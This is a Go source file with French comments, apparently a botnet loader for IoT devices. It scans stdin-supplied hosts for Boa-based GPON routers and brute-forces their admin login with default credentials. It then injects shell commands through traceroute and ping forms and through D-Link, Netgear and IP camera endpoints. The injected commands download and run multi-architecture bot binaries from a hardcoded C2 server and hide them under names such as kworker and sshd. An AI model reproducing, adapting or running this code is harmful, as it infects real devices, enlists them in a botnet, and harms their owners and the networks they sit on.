/*
Thrown out by bermuda!
*/

package main

import (
	"fmt"
    "net"
    "time"
    "bufio"
    "os"
    "sync"
    "strings"
	"strconv"
    "math/rand"
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound int
var loginsString = []string{"adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default", "admin:password123"}

// Serveur C2 - séparer l'adresse IP et le port pour les commandes wget/curl
var c2ServerIP = "51.68.128.169"
var c2ServerPort = "1337"
var c2Server = c2ServerIP + ":" + c2ServerPort

// Sémaphore pour limiter les connexions concurrentes
var sem = make(chan struct{}, 1000) // Limite à 1000 connexions concurrentes
var mutex = &sync.Mutex{}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

// Exploiter la vulnérabilité RCE dans les routeurs D-Link
func exploitDlinkRCE(target string, c2Server string, hideName string, malwarePath string) {
	// Vulnérabilité d'exécution de commande dans les routeurs D-Link
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return
	}

	// Construire la commande d'exploitation
	exploitCmd := fmt.Sprintf("command=wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
		c2ServerIP, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("POST /apply.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s\r\n\r\n",
		target, len(exploitCmd), exploitCmd)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(httpRequest))
	conn.Close()
}

// Exploiter la vulnérabilité dans les routeurs Netgear
func exploitNetgearRCE(target string, c2Server string, hideName string, malwarePath string) {
	// Vulnérabilité d'exécution de commande dans les routeurs Netgear
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return
	}

	// Construire la commande d'exploitation
	exploitCmd := fmt.Sprintf("wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
		c2Server, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=%s&curpath=/&currentsetting.htm=1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
		exploitCmd, target)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(httpRequest))
	conn.Close()
}

// Exploiter la vulnérabilité dans les caméras IP
func exploitIPCameraRCE(target string, c2Server string, hideName string, malwarePath string) {
	// Vulnérabilité d'exécution de commande dans les caméras IP
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return
	}

	// Construire la commande d'exploitation
	exploitCmd := fmt.Sprintf("wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
		c2Server, malwarePath, hideName, hideName, hideName)
	
	// Envoyer la requête pour exploiter la vulnérabilité
	httpRequest := fmt.Sprintf("GET /system.ini?loginuse&loginpas&%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
		exploitCmd, target)

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(httpRequest))
	conn.Close()
}

func sendExploit(target string) int {
	// Liste des différents malwares à tester (tous hébergés sur votre serveur C2)
	malwares := []struct {
		name string
		path string
		arch string
		args string // Arguments à passer au malware lors de l'exécution
		priority int // Priorité d'infection (plus le chiffre est bas, plus la priorité est élevée)
	}{
		{"bot", "/bot.mips", "mips", "mips", 1},         // Très courant dans les routeurs
		{"bot", "/bot.arm", "arm", "arm", 2},           // Courant dans les appareils IoT
		{"bot", "/bot.arm7", "arm7", "arm7", 3},       // Appareils ARM modernes
		{"bot", "/bot.x86", "x86", "x86", 4},           // Ordinateurs 32 bits
		{"bot", "/bot.x86_64", "x86_64", "x86_64", 5}, // Ordinateurs 64 bits
		{"bot", "/bot.sh4", "sh4", "sh4", 6},           // Appareils embarqués
		{"bot", "/bot.m68k", "m68k", "m68k", 7},       // Anciens systèmes
		{"bot", "/bot.ppc", "ppc", "ppc", 8},           // PowerPC
		{"bot", "/bot.sparc", "sparc", "sparc", 9},     // Serveurs SPARC
	}

	// Noms alternatifs pour camoufler le malware
	hideNames := []string{
		"sysupdate",
		"systemd-worker",
		"kworker",
		"crond",
		"udevd",
		"ntpd",
		"sshd",
		"dropbear",
		"telnetd",
	}

	// Utiliser les variables globales c2ServerIP, c2ServerPort et c2Server définies au niveau du package
	
	// Chemins d'installation alternatifs
	installPaths := []string{
		"/tmp",
		"/var/tmp",
		"/dev",
		"/var/run",
		"/var/lock",
		"/bin",
		"/usr/bin",
		"/usr/local/bin",
	}

	// Essayer chaque malware en fonction de sa priorité
	// Trier les malwares par priorité (les plus prioritaires d'abord)
	for _, malware := range malwares {
		// Sélectionner un nom aléatoire pour ce malware
		hideName := hideNames[rand.Intn(len(hideNames))]
		
		// Essayer plusieurs chemins d'installation
		for _, installPath := range installPaths {
			conn, err := net.DialTimeout("tcp", target, 10 * time.Second) // Réduit à 10 secondes pour accélérer
			if err != nil {
				break // Si on ne peut pas se connecter, passer au malware suivant
			}
			
			// Construire la commande d'exploitation avec wget et nom caché
			exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bwget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
				installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
			
			// Envoyer la requête pour notre serveur C2
			httpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
				target, len(exploitCmd)+29, target, target, exploitCmd)

			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			conn.Write([]byte(httpRequest))
			conn.Close() // Fermer immédiatement pour accélérer
			
			// Essayer avec curl comme alternative à wget
			conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
			if err == nil {
				curlCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bcurl%%20http://%s%s%%20-o%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
					installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
				
				curlRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
					target, len(curlCmd)+29, target, target, curlCmd)

				conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
				conn2.Write([]byte(curlRequest))
				conn2.Close()
			}
			
			// Essayer avec busybox wget comme troisième option
			conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
			if err == nil {
				busyboxCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bbusybox%%20wget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
					installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
				
				busyboxRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
					target, len(busyboxCmd)+29, target, target, busyboxCmd)

				conn3.SetWriteDeadline(time.Now().Add(10 * time.Second))
				conn3.Write([]byte(busyboxRequest))
				conn3.Close()
			}
		}
		
		// Pause très courte entre les tentatives
		time.Sleep(100 * time.Millisecond)
	}

	// Exploiter d'autres vulnérabilités connues dans différents appareils
	// 1. Exploiter la vulnérabilité RCE dans les routeurs D-Link
	exploitDlinkRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
	
	// 2. Exploiter la vulnérabilité dans les routeurs Netgear
	exploitNetgearRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
	
	// 3. Exploiter la vulnérabilité dans les caméras IP
	exploitIPCameraRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
	
	// 4. Essayer aussi avec tftp comme méthode alternative de téléchargement
	for _, installPath := range installPaths[:3] { // Limiter aux 3 premiers chemins pour économiser du temps
		hideName := hideNames[rand.Intn(len(hideNames))]
		conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
		if err == nil {
			tftpCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Btftp%%20-g%%20-r%%20bot.mips%%20%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20mips%%20&", 
				installPath, hideName, c2ServerIP, installPath, hideName, installPath, hideName)
			tftpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
				target, len(tftpCmd)+29, target, target, tftpCmd)

			conn3.SetWriteDeadline(time.Now().Add(10 * time.Second))
			conn3.Write([]byte(tftpRequest))
			conn3.Close()
		}
	}
	
	// 5. Essayer avec une injection de commande dans le paramètre ping
	conn4, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err == nil {
		hideName := hideNames[rand.Intn(len(hideNames))]
		pingCmd := fmt.Sprintf("ping_addr=127.0.0.1;wget%%20http://%s/bot.mips%%20-O%%20/tmp/.%s;chmod%%20777%%20/tmp/.%s;/tmp/.%s%%20mips%%20&", 
			c2ServerIP, hideName, hideName, hideName)
		pingRequest := fmt.Sprintf("POST /boaform/admin/formPing HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_ping_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s\r\n\r\n",
			target, len(pingCmd), target, target, pingCmd)

		conn4.SetWriteDeadline(time.Now().Add(10 * time.Second))
		conn4.Write([]byte(pingRequest))
		conn4.Close()
	}

	return 1
}

func sendLogin(target string) int {

	var isLoggedIn int = 0
	var cntLen int

	for x := 0; x < len(loginsString); x++ {
		loginSplit := strings.Split(loginsString[x], ":")

		conn, err := net.DialTimeout("tcp", target, 30 * time.Second) // Réduit à 30 secondes
	    if err != nil {
			return -1
	    }

		cntLen = 14
		cntLen += len(loginSplit[0])
		cntLen += len(loginSplit[1])

	    conn.SetWriteDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes
	    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
		    return -1
		}

		if strings.Contains(string(bytebuf), "HTTP/1.0 302 Moved Temporarily") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		// statusLogins est maintenant incrémenté dans processTarget
		conn.Close()
		break
	}

	if isLoggedIn == 1 {
		return 1
	} else {
		return -1
	}
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return -1
    }
    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=admin&psd=Feefifofum\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return -1
	}

	if strings.Contains(string(bytebuf), "Server: Boa/0.93.15") {
		// Ne pas incrémenter statusFound ici, c'est fait dans processTarget
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {
	// Acquérir le sémaphore
	sem <- struct{}{}
	defer func() {
		// Libérer le sémaphore quand on a terminé
		<-sem
		syncWait.Done()
	}()

	// Vérifier si l'appareil est vulnérable
	if checkDevice(target, 10) == 1 {
		// Incrémenter le compteur de manière thread-safe
		mutex.Lock()
		statusFound++
		mutex.Unlock()
		
		// Tenter de se connecter et d'exploiter
		if sendLogin(target) == 1 {
			mutex.Lock()
			statusLogins++
			mutex.Unlock()
		}
		sendExploit(target)
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./fiber [port]")
		os.Exit(1)
	}

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
    go func() {
        for {
            fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d\r\n", i, statusAttempted, statusFound, statusLogins)
            time.Sleep(1 * time.Second)
            i++
        }
    }()

    // Initialiser le sémaphore
    for i := 0; i < 1000; i++ {
        sem <- struct{}{}
        <-sem
    }

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            target := scan.Text()
            mutex.Lock()
            statusAttempted++
            mutex.Unlock()
            syncWait.Add(1)
            go processTarget(target + ":" + os.Args[1], target)
        }
    }
}
